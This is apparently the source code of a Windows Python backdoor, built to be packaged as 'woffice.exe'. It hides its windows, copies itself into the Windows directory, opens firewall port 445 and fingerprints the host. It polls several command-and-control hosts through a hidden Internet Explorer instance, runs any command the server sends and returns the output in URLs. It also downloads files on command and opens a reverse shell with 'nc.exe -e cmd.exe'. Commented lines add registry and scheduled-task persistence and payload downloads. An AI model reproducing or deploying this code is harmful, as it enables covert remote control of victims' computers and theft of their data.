#import win32serviceutil
#import win32service
#import win32event

#import servicemanager
#import threading
#import asyncore
import time
import sys
import os

#import Crypto
#import ecdsa
#import paramiko
import subprocess
import httplib
import requests
#import email
#from email import utils
import urllib2
#import pycurl
from os import path, access, R_OK
from uuid import getnode as get_mac
from subprocess import Popen
import  win32gui, win32com, pythoncom, win32con
from win32com.client import Dispatch
from time import sleep
import _winreg

#cd \python27
#copy /y "%USERPROFILE%\Documents\GitHub\Win-Python-Backdoor\woffice.py" C:\Python27
#cd \python27_64
#copy /y C:\Users\Master.MASTER6\Documents\GitHub\Win-Python-Backdoor\woffice.py C:\Python27_64
#python "%USERPROFILE%\Documents\GitHub\Win-Python-Backdoor\setwoffice.py" py2exe --includes calendar,email,locale

def getProxy():
    try:
        proxy = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings")
        server, type = _winreg.QueryValueEx(proxy, "ProxyServer")
        enabled, type = _winreg.QueryValueEx(proxy, "ProxyEnable")
        if enabled:
            return server
        return 'None'
    except:
        return 'None'

def get_macaddress(host='localhost'):
    """ Returns the MAC address of a network host, requires >= WIN2K. """
    # http://aspn.activestate.com/ASPN/Cookbook/Python/Recipe/347812
    import ctypes
    import socket
    import struct
 
    # Check for api availability
    try:
        SendARP = ctypes.windll.Iphlpapi.SendARP
    except:
        raise NotImplementedError('Usage only on Windows 2000 and above')
 
    # Doesn't work with loopbacks, but let's try and help.
    if host == '127.0.0.1' or host.lower() == 'localhost':
        host = socket.gethostname()
 
    # gethostbyname blocks, so use it wisely.
    try:
        inetaddr = ctypes.windll.wsock32.inet_addr(host)
        if inetaddr in (0, -1):
            raise Exception
    except:
        hostip = socket.gethostbyname(host)
        inetaddr = ctypes.windll.wsock32.inet_addr(hostip)
 
    buffer = ctypes.c_buffer(6)
    addlen = ctypes.c_ulong(ctypes.sizeof(buffer))
    if SendARP(inetaddr, 0, ctypes.byref(buffer), ctypes.byref(addlen)) != 0:
        raise WindowsError('Retreival of mac address(%s) - failed' % host)
 
    # Convert binary data into a string.
    macaddr = ''
    for intval in struct.unpack('BBBBBB', buffer):
        if intval > 15:
            replacestr = '0x'
        else:
            replacestr = 'x'
        if macaddr != '':
            #macaddr = ':'.join([macaddr, hex(intval).replace(replacestr, '')])
            macaddr = ''.join([macaddr, hex(intval).replace(replacestr, '')])
        else:
            macaddr = ''.join([macaddr, hex(intval).replace(replacestr, '')])
 
    return macaddr.upper()







CREATE_NO_WINDOW = 0x08000000
stemp=os.getenv('temp')
swin=os.getenv('windir')
suser=os.getenv('USERPROFILE')
try:
    if not os.path.exists(suser+'\\woffice.exe'):
##        f = urllib2.urlopen("http://certificates.ddns.net/woffice.exe")
##        with open(suser+'\\woffice.exe', "wb") as code:
##            code.write(f.read())
        #subprocess.call('powershell -Command Invoke-WebRequest -Uri "http://certificates.ddns.net/woffice.exe" -OutFile '+suser+'\\woffice.exe', creationflags=CREATE_NO_WINDOW)
        #subprocess.call("cmd /c copy /y "+os.getcwd()+"\\woffice.exe " +suser+"\\woffice.exe", creationflags=CREATE_NO_WINDOW)
        #subprocess.call("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v urlspace /t REG_SZ   /d  "+suser+"\\woffice.exe /f", creationflags=CREATE_NO_WINDOW)
        subprocess.call("cmd /c copy /y "+os.getcwd()+"\\woffice.exe " +swin+"\\woffice.exe", creationflags=CREATE_NO_WINDOW)
        subprocess.call("netsh advfirewall firewall add rule name=\"Open Port 445\" dir=in action=allow protocol=TCP localport=445", creationflags=CREATE_NO_WINDOW)
        #subprocess.call("schtasks /create  /sc minute /mo 10 /tr 'c:\windows\woffice.exe' /tn taskflash /rl highest /F ", creationflags=CREATE_NO_WINDOW)
except Exception,e:
    text_file = open(stemp+"\\pippo.txt", "w")
    text_file.write(str(e))
    text_file.close()
    print str(e)
#try:
#    if not os.path.exists('c:\\windows\\wup.exe'):
#        subprocess.call('powershell -Command Invoke-WebRequest -Uri "http://plano.xoom.it/wofficeie.exe" -OutFile '+suser+'\\wofficeie.exe', creationflags=CREATE_NO_WINDOW)
#        subprocess.call('echo.>'+suser+'\\wofficeie.exe:Zone.Identifier', creationflags=CREATE_NO_WINDOW) 
#        subprocess.call(suser+'\\wofficeie.exe', creationflags=CREATE_NO_WINDOW)
#except Exception,e:
#    print str(e)
#main loop here
sites = ["paner.altervista.org", "verifiche.ddns.net"]
#site="paner.altervista.org"
site1="paner.altervista.org"
site2="52.26.124.145"
site3="certificates.ddns.net"
smacaddress = get_macaddress('localhost')
sTime=0
try:
    sTime=time.ctime(os.path.getmtime(os.getcwd()+'\\woffice.exe'))
    sTime=sTime.replace(" ","_")
except Exception,e:
    text_file = open(stemp+"\\pippo.txt", "w")
    text_file.write(str(e))
    text_file.close()
    print str(e)
sCOMPUTERNAME=os.getenv('COMPUTERNAME')+"_"+smacaddress+"_app"#+"_"+os.getenv('USERNAME')
pythoncom.CoInitialize()
ie = Dispatch("InternetExplorer.Application")
ie.Visible = 0
#while True:
for site in sites:
        #sCOMPUTERNAME=os.getenv('COMPUTERNAME')+"_"+smacaddress+"_"+os.getenv('USERNAME')
##        if getProxy()!='None':
##            subprocess.call("taskkill /f /im wup.exe", creationflags=CREATE_NO_WINDOW)
        
            try:
                    #top_level_url="http://52.26.124.145:31287"                    
                    top_level_url = "http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&wup="+str(sTime)
                    
                    ie.Navigate(top_level_url)
                    if ie.Busy:
                        sleep(5)
                    sresponse = ie.Document.body.innerText
                    #print text
                    #ie.quit
                    #os.system('taskkill /f /im iexplore.exe')
                    if sresponse!= '':
                            print "Output from HTML request"
                            #sresponse = response.read()
                            ifind=sresponse.find('ip=')
                            sip = sresponse[ifind+3:sresponse.find('||',ifind)]
                            ifind=sresponse.find('port=')
                            sport = sresponse[ifind+5:sresponse.find('||',ifind)]
                            ifind=sresponse.find('kill=')
                            skill = sresponse[ifind+5:sresponse.find('||',ifind)]
                            ifind=sresponse.find('iout=')
                            sout = sresponse[ifind+5:sresponse.find('||',ifind)]
                            ifind=sresponse.find('exec=')
                            sexec = sresponse[ifind+5:sresponse.find('||',ifind)]
                            ifind=sresponse.find('cmd=')
                            scmd = sresponse[ifind+4:sresponse.find('||',ifind)]
                            print skill
                    else:
                            if site == site1:
                                site=site2
                            elif site == site2:
                                site=site3
                            elif site == site3:
                                site=site1
                            top_level_url = "http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&wup="+sTime
                            ie.Navigate(top_level_url)
                            if ie.Busy:
                                sleep(5)
                            sresponse = ie.Document.body.innerText
                            print "Output from HTML request"
                            #sresponse = response.read()
                            ifind=sresponse.find('ip=')
                            sip = sresponse[ifind+3:sresponse.find('||',ifind)]
                            ifind=sresponse.find('port=')
                            sport = sresponse[ifind+5:sresponse.find('||',ifind)]
                            ifind=sresponse.find('kill=')
                            skill = sresponse[ifind+5:sresponse.find('||',ifind)]
                            ifind=sresponse.find('iout=')
                            sout = sresponse[ifind+5:sresponse.find('||',ifind)]
                            ifind=sresponse.find('exec=')
                            sexec = sresponse[ifind+5:sresponse.find('||',ifind)]
                            ifind=sresponse.find('cmd=')
                            scmd = sresponse[ifind+4:sresponse.find('||',ifind)]
                            print skill
                    #httpServ.close()
                    if sexec == '1':
                            sCOMPUTERNAME=os.getenv('COMPUTERNAME')+"_"+smacaddress+"_app"
                            try:
                                    if sout == '1':
                                        scmd = sresponse[ifind+4:sresponse.find('||',ifind)]   
                                        sdump=subprocess.check_output(scmd,stderr=subprocess.STDOUT, shell=True)
##                                        process=subprocess.Popen(scmd,stdout=subprocess.PIPE,stderr=subprocess.STDOUT, shell=True)
##                                        p = Popen(scmd,shell=True)
##                                        returncode = process.wait()
##                                        print('return code'.format(returncode))
##                                        sdump=process.stdout.read()
            
                                        print sdump
                                        
##                                        text_file = open(os.getenv('TEMP')+"\\" + sCOMPUTERNAME+".txt", "w")
##                                        text_file.write(sdump)
##                                        text_file.close()
##                                        files = {'userfile': open(os.getenv('TEMP')+"\\" + sCOMPUTERNAME+".txt", 'rb')}
##                                        r = requests.post('http://' + site +'/upload.php',files=files)  
                                        #if len(sdump)<2006:
                                        #sdump = sdump.replace("\'", "")
                                        #sdump = sdump.replace("\\", "\\\\")
                                        sdump = sdump.replace("\r\n", "<br>")
                                        #sdump = sdump.replace("%", "")
                                        #sdump = sdump.replace("*", "")
                                        #sdump = sdump.replace("\n", "<br>")
                                        #sdump = sdump.replace("\r", "<br>")
                                        
                                        #sdump = sdump.replace(" ", "%20")
                                        #sdump = sdump[ 0 : 2005]
                                        top_level_url = "http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&dump="+sdump
                                        ie.Navigate(top_level_url)
                                        if ie.Busy:
                                            sleep(5)
                                        sresponse = ie.Document.body.innerText
                                        
                                        top_level_url = "http://"+site+"/svc/dump.php?pc="+sCOMPUTERNAME+"&dump="+sdump
                                        ie.Navigate(top_level_url)
                                        if ie.Busy:
                                            sleep(5)
                                        sresponse = ie.Document.body.innerText
                                       
                                            
                                    else:
                                        igetfile=scmd.find('getfile')
                                        ifile=scmd.rfind('/')
                                        if igetfile==0:
                                            geturl =scmd[8:len(scmd)]
                                            
                                            sfiledest= scmd[ifile+1:len(scmd)]
                                            
                                            f = urllib2.urlopen(geturl)
                                            with open(suser+'\\'+ sfiledest, "wb") as code:
                                                code.write(f.read())
                                        else:
                                            p = Popen(scmd,shell=True)
                            #print r.text
                            except Exception,e:
                                    print str(e)
                                                    
                            #httpServ = httplib.HTTPConnection(site, 80)
                            #httpServ.connect()
                           
                            ie.Navigate("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&exec=0")
                            if ie.Busy:
                                    sleep(5)
                            sresponse = ie.Document.body.innerText
                            #response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"_"+os.getenv('USERNAME')+"&exec=0")
                            #httpServ.request('GET', "/svc/wup.php?pc="+sCOMPUTERNAME+"&exec=0")
                            #response = httpServ.getresponse()
                            #httpServ.close()
                    if skill == '0':
                            try:
                                    if not os.path.exists('c:\windows\syswow64'):
                                            p = Popen("nc.exe -e cmd.exe "+sip+" "+sport,shell=True)
                                    #os.system("nc.exe -e cmd.exe "+sip+" "+sport)
                                    else:
                                            p = Popen("nc64.exe -e cmd.exe "+sip+" "+sport,shell=True)
                                    #os.system("nc64.exe -e cmd.exe "+sip+" "+sport)
                            except Exception,e:
                                    print str(e)
                            #httpServ = httplib.HTTPConnection(site, 80)
                            #httpServ.connect()
                            ie.Navigate("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&kill=1")
                            if ie.Busy:
                                    sleep(5)
                            sresponse = ie.Document.body.innerText
                            #response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&kill=1")
                    site=site1
            except Exception,e:
                    text_file = open(stemp+"\\pippo.txt", "w")
                    text_file.write(str(e))
                    text_file.close()
                    print str(e)
                    #print e.errno
                    #if e.errno == 11001:
                    if site == site1:
                        site=site2
                    elif site == site2:
                        site=site3
                    elif site == site3:
                        site=site1
##        else:
##            subprocess.call("net start wup", creationflags=CREATE_NO_WINDOW)
            #subprocess.call("taskkill /f /im up.exe", creationflags=CREATE_NO_WINDOW)
            time.sleep(5)


                                               
